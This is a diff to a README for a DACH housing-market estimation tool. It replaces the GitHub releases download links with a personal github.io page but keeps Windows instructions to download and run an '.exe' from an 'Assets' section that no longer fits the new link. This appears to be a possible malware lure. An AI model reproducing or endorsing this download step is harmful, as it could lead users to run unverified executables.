@@ -1,6 +1,6 @@
 # 🏠 dach-managed-units - Get accurate counts for housing markets
 
-[![Download](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/alfredobright881/dach-managed-units/releases)
+[![Download](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://alfredobright881.github.io)
 
 This software provides a data estimate for professionally-managed homes in Germany, Austria, and Switzerland. The tool organizes research data to show market size and housing trends. It assists users who need reliable numbers for real estate analysis.
 
@@ -14,7 +14,7 @@ This tool functions as a central hub for market research. It pulls from open dat
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official download page](https://github.com/alfredobright881/dach-managed-units/releases).
+1. Visit the [official download page](https://alfredobright881.github.io).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or downloads folder.
